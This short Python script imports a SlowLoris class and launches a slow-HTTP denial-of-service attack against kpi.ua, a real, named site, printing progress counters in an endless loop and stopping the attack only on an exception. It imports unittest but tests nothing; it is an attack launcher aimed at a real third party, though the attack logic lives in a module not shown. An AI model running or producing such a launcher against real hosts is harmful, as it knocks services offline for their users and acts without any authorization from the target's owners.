import sys
import time
import unittest

from slowloris import SlowLoris

if __name__ == '__main__':
    s = SlowLoris(url="kpi.ua")
    s.start()
    while True:
        try:
            sys.stdout.write("\r{}".format(s.get_counters()))
            sys.stdout.flush()
            time.sleep(1)
        except:
            s.kill()
            sys.exit(-1)
